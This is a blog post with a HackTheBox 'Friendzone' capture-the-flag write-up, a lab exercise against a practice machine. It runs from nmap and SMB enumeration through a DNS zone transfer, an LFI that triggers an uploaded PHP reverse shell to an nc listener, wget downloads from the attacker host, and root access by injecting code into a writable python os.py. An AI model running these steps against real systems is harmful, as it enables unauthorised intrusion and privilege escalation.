---
layout: post
title: HackTheBox Friendzone (10.10.10.123) Writeup
description: >
  Hackthebox Friendzone Writeup
image: /assets/img/friendzone.png
noindex: true
---

First I start with an Nmap scan

```
# nmap -sV -sC -T4 10.10.10.123                                                                                                                                         [4/1115]
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-19 09:39 EDT                                                                                                                                             
Nmap scan report for 10.10.10.123                                                                                                                                                                           
Host is up (0.034s latency).                                                                                                                                                                                
Not shown: 993 closed ports                                                                                                                                                                                 
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 3h00m41s, deviation: 1h43m53s, median: 4h00m39s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2019-09-19T20:40:46+03:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-09-19T17:40:45
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.99 seconds
```
A decent amount of ports are open but something I noticed is under <b>Port 443</b> it mentions a common name <b>friendzone.red</b>. Seeing this I put <b>friendzone.red</b> in my <b>/etc/hosts</b> file.
```
127.0.0.1       localhost
127.0.1.1       edc
10.10.10.123    friendzone.red

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
Before I Int and explored port <b>80</b> and <b>443</b> I wanted to check out some of the other ports to see if I could find anything useful. I used <b>smbclient</b> to list the share folders. When it asks for a password just leave it blank
```
smbclient -L 10.10.10.123
Enter WORKGROUP\root's password:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            FRIENDZONE
```
After checking through the folders I discovered that I have Read/Write permissions to the <b>Development</b> folder and inside the <b>general</b> folder there is a file with some credentials.
```
# smbclient -U none //10.10.10.123/general password
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Id Jan 16 15:10:51 2019
  ..                                  D        0  Id Jan 23 16:51:02 2019
  creds.txt                           N       57  Tue Oct  9 19:52:42 2018

                9221460 blocks of size 1024. 6460356 blocks available

# cat creds.txt
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```
Now to explore port <b>53</b>. I use <b>dig</b> for this
```
# dig axfr friendzone.red @10.10.10.123

; <<>> DiG 9.11.5-P4-5.1+b1-Debian <<>> axfr friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 289 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Thu Sep 19 09:59:19 EDT 2019
;; XFR size: 8 records (messages 1, bytes 289)
```
From the output I can see a few subdomains. Lets add these to the <b>/etc/hosts</b> file as Ill
```
cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       edc
10.10.10.123    friendzone.red
10.10.10.123    administrator1.friendzone.red
10.10.10.123    hr.friendzone.red
10.10.10.123    uploads.friendzone.red

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```
Time to explore some of those domains. Navigating to <b>https://administrator1.friendzone.red</b> I get greeted with a login page. This would be a good time to try those credentials.

![login.png](../../resources/b257236405844774b8211e7fd01df6f6.png)

Once logged in I are greeted with a success message and it tells us another directory to visit.

![success.png](../../resources/6246a5190ad44840a93adcf076d8e1f4.png)

Navigating to <b>/dashboard.php</b> I are greeted with a message that basically tells us that the page is vulnerable.

![vuln.png](../../resources/be2cb7b78a8246029b2257e2787c9330.png)

If I add the included paramater to the link then I are greeted with yet another message that tells us the parameter is wrong witch hints that I need to use an LFI

![parameter.png](../../resources/b1250ca8039847019f214f59b1d1f0bd.png)

So for the LFI I are going to upload the reverse shell to the <b>Development</b> share since I have Read/Write privileges to it.

```
# smbclient -U none //10.10.10.123/Development password
Try "help" to get a list of possible commands.
smb: \> put php-reverse-shell.php
putting file php-reverse-shell.php as \php-reverse-shell.php (30.8 kb/s) (average 30.8 kb/s)
```
Now I set up our <b>nc</b> listener on the port I specified in our shell
```
# nc -lvnp 10000
listening on [any] 10000 ...
```
Took me some time to find where the Development folder is stored but after some time I found it. To trigger the LFI navigate to <b>https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=../../../../../../..//etc/Development/php-reverse-shell</b>. Just make sure you put in the name of your shell and not mine. If you did everything correctly you should get a shell.
```
# nc -lvnp 10000
listening on [any] 10000 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.123] 46614
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 21:39:24 up  1:06,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
This next step is not necessary but I did it just to give myself a more responsive shell
```
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@FriendZone:/$ ^Z
[1]+  Stopped                 nc -lvnp 10000
# stty raw -echo; fg
nc -lvnp 10000

www-data@FriendZone:/$
```
Now I have a shell with tab complete. At this point you can go to <b>/home/friend/</b> and read the <b>user.txt</b> file. I do some basic enumeration and eventually find a <b>mysql_data.conf</b> in <b>/var/www</b>.
```
ls /var/www
admin       friendzoneportal       html             uploads
friendzone  friendzoneportaladmin  mysql_data.conf
```
If I read the file I see some credentials.
```
# cat mysql_data.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```
Even though the credentials say they are for a mysql database I decided to try them in ssh. Turns out they worked.
```
# ssh friend@10.10.10.123
The authenticity of host '10.10.10.123 (10.10.10.123)' can't be established.
ECDSA key fingerprint is SHA256:/CZVUU5zAwPEcbKUWZ5tCtCrEemowPRMQo5yRXTWxgw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.123' (ECDSA) to the list of known hosts.
friend@10.10.10.123's password:
Ilcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

You have mail.
Last login: Thu Jan 24 01:20:15 2019 from 10.10.14.3
friend@FriendZone:~$
```
I first decide to run an Enum script to see what it can find. I am going to use a <b>python SimpleHTTPServer</b> to copy the script over from my host machine.
```
# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```
Then I use <b>wget</b> on the box to download it.
```
friend@FriendZone:/tmp$ wget 10.10.14.21/lse.sh
--2019-09-19 22:07:31--  http://10.10.14.21/lse.sh
Connecting to 10.10.14.21:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 30962 (30K) [text/x-sh]
Saving to: ‘lse.sh’

lse.sh                                             100%[================================================================================================================>]  30.24K  --.-KB/s    in 0.07s   

2019-09-19 22:07:32 (458 KB/s) - ‘lse.sh’ saved [30962/30962]
```
After running the script I will see that there are a few files I have write permssions too. Just take note of these for now
```
[*] fst000 Writable files outside user's home.............................. yes!
---
/etc/sambafiles
/etc/Development
/etc/Development/php-reverse-shell.php
/var/spool/samba
/var/tmp
/var/mail/friend
/var/lib/samba/usershares
/var/lib/php/sessions
/tmp
/tmp/output.txt
/tmp/lse.sh
/tmp/.Test-unix
/tmp/.ICE-unix
/tmp/.font-unix
/tmp/pspy64
/tmp/.X11-unix
/tmp/.XIM-unix
/home/friend
/usr/lib/python2.7
/usr/lib/python2.7/os.pyc
/usr/lib/python2.7/os.py
```
Now next I download a program called <b>pspy</b> to look at processes running in the background.
```
friend@FriendZone:/tmp$ wget 10.10.14.21/pspy64                                                       
--2019-09-19 21:58:12--  http://10.10.14.21/pspy64                                                    
Connecting to 10.10.14.21:80... connected.                                                            
HTTP request sent, awaiting response... 200 OK                                                        
Length: 4468984 (4.3M) [application/octet-stream]                                                     
Saving to: ‘pspy64’                                                                                   

pspy64                    100%[===================================>]   4.26M   291KB/s    in 19s      

2019-09-19 21:58:31 (233 KB/s) - ‘pspy64’ saved [4468984/4468984]                                     
```
Make the file executable and then run it. You might have to wait a little bit but eventually you should see something interesting.
```
2019/09/19 22:02:01 CMD: UID=0    PID=1445   | /bin/sh -c /opt/server_admin/reporter.py
2019/09/19 22:02:01 CMD: UID=0    PID=1444   | /bin/sh -c /opt/server_admin/reporter.py
```
I have a python file that is being executed as root. Lets check that file out to see if I can do anything.
```
friend@FriendZone:~$ ls -la /opt/server_admin/reporter.py
-rwxr--r-- 1 root root 424 Jan 16  2019 /opt/server_admin/reporter.py
```
So I have read permissions. Reading the file I see something good.
```
friend@FriendZone:~$ cat /opt/server_admin/reporter.py
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```
The script doesn't do too much but it does use the <b>os</b> module which if you remember from the Enum scipt I know that I have write permissions to it. So lets edit the <b>/usr/lib/python2.7/os.py</b> and add in some code at the top that reads the root flag for us.
```
with open('/root/root.txt', 'r') as f:
  output = f.readline()
with open('/tmp/rootpass.txt', 'w') as o:
  o.write(output)
```
Now just wait a little bit and you should see the <b>rootpass.txt</b> file in the </b>/tmp</b> fdirectory with the root flag inside it.
<br><br><br>
